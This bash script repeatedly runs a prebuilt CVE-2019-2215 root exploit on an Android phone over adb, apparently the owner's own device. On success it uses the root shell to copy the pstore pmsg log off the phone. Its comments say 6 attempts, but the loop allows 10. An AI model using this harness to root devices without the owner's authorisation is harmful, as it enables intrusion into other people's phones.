#!/bin/bash
# The root-retry loop, v3.
#
# What the loses taught (2026-10-03):
#   * a win lands within ~16 min of the run; a 60-min wait bought nothing, so
#     the poll is 25 min - more attempts per hour
#   * a failed run hangs the FOLLOWING boot (mid-boot, 2 interfaces, black
#     screen, no adb); only a physical power press revives it.  So after a
#     failure this reboots and then waits patiently (up to 3 h) for adb to come
#     back - the press can happen whenever the user feels up to it.
#   * the pmsg record survives all of this; nothing here can lose the data.
# Bounded at 6 attempts so the notification carries a verdict.
set -u
cd "$(dirname "$0")"
LOG=usb_runs/pmsg_read3.log
say() { echo "$(date '+%H:%M:%S') $*" | tee -a "$LOG"; }

EXP=/data/local/tmp/cve-2019-2215
FROZEN="$HOME/dev/p20-root/working/cve-2019-2215_0x134c838"
WANT_MD5=$(md5sum "$FROZEN" | cut -d' ' -f1)

adb_present() { timeout 8 adb devices 2>/dev/null | grep -qP '^\S+\tdevice$'; }

wait_for_adb() {  # $1 = hours, prints when found
  local tries=$(( ${1} * 60 )) i
  for i in $(seq 1 "$tries"); do
    adb_present && return 0
    [ $((i % 10)) -eq 0 ] && say "  ...still no adb ($((i / 60)) min in)"
    sleep 60
  done
  return 1
}

attempt=0
SKIP_REBOOT=0
while [ $attempt -lt 10 ]; do
  attempt=$((attempt+1))
  say "===== attempt $attempt ====="

  FRESH=0
  if ! adb_present; then
    say "no adb: waiting up to 3 h for the phone (a physical press revives a hung boot)"
    if ! wait_for_adb 3; then
      say "adb did not return within 3 h - stopping; re-arm when the phone wakes"
      exit 1
    fi
    FRESH=1
    say "adb is back"
  fi

  if [ $FRESH = 0 ] && [ $SKIP_REBOOT = 0 ]; then
    say "rebooting for a clean heap"
    timeout 60 adb reboot 2>/dev/null
    sleep 40
  fi
  SKIP_REBOOT=0

  say "waiting for a settled boot (up to 30 min; post-failure boots can hang)"
  OK=0
  for i in $(seq 1 120); do
    if adb_present; then
      bc=$(timeout 10 adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
      up=$(timeout 10 adb shell cat /proc/uptime 2>/dev/null | awk '{print int($1)}')
      if [ "$bc" = "1" ] && [ -n "${up:-}" ] && [ "$up" -lt 900 ]; then OK=1; break; fi
    fi
    sleep 15
  done
  if [ "$OK" != 1 ]; then
    say "no settled boot - the boot hung; waiting up to 3 h for a physical press"
    if ! wait_for_adb 3; then
      say "still nothing after 3 h - stopping; re-arm when the phone wakes"
      exit 1
    fi
    say "phone is awake; will skip the reboot and re-check the boot directly"
    SKIP_REBOOT=1
    continue
  fi
  say "settled at $(timeout 10 adb shell cat /proc/uptime 2>/dev/null | awk '{print int($1)}')s uptime; settling 300s"
  sleep 300

  GOT_MD5=$(timeout 30 adb shell "md5sum $EXP 2>/dev/null" | awk '{print $1}')
  if [ "$GOT_MD5" != "$WANT_MD5" ]; then
    timeout 60 adb push "$FROZEN" "$EXP" 2>&1 | tail -1
    timeout 10 adb shell "chmod 755 $EXP"
  fi

  say "starting the root shell (poll 25 min)"
  IN=/tmp/anepmsg3_in; OUT=usb_runs/pmsg_read3_att$attempt.out
  rm -f "$IN"; : > "$OUT"; mkfifo "$IN"
  adb shell "$EXP" < "$IN" >> "$OUT" 2>&1 &
  EXP_PID=$!
  exec 9> "$IN"
  ROOT=0
  for i in $(seq 1 1500); do
    grep -q "uid=0(root)" "$OUT" 2>/dev/null && { say "ROOT after ${i}s"; ROOT=1; break; }
    if ! kill -0 "$EXP_PID" 2>/dev/null; then say "exploit client exited early"; break; fi
    sleep 1
  done
  if [ "$ROOT" != 1 ]; then
    say "attempt $attempt: no root"
    exec 9>&-
    kill "$EXP_PID" 2>/dev/null
    sleep 5
    continue
  fi

  runroot() {
    local mark="MK$RANDOM$RANDOM" before
    before=$(wc -c < "$OUT")
    printf 'echo %s\n%s\necho %s\n' "$mark" "$1" "$mark" >&9
    for i in $(seq 1 180); do
      sleep 1
      [ "$(tail -c +$((before+1)) "$OUT" | grep -c "^$mark$")" -ge 2 ] && break
    done
    tail -c +$((before+1)) "$OUT" | awk -v m="$mark" 'BEGIN{n=0} {if ($0==m){n++; next} if (n==1) print}'
  }

  say "== reading pstore into /data/local/tmp"
  runroot 'cat /sys/fs/pstore/pmsg-ramoops-0 > /data/local/tmp/pmsg.bin; echo pmsg_rc=$?; ls -la /data/local/tmp/pmsg.bin' | sed 's/^/    /'
  say "== pulling"
  timeout 120 adb pull /data/local/tmp/pmsg.bin usb_runs/pmsg.bin 2>&1 | tail -1
  ls -la usb_runs/pmsg.bin 2>/dev/null

  exec 9>&-
  kill "$EXP_PID" 2>/dev/null
  say "SUCCESS on attempt $attempt"
  exit 0
done
say "all 6 attempts exhausted"
exit 1
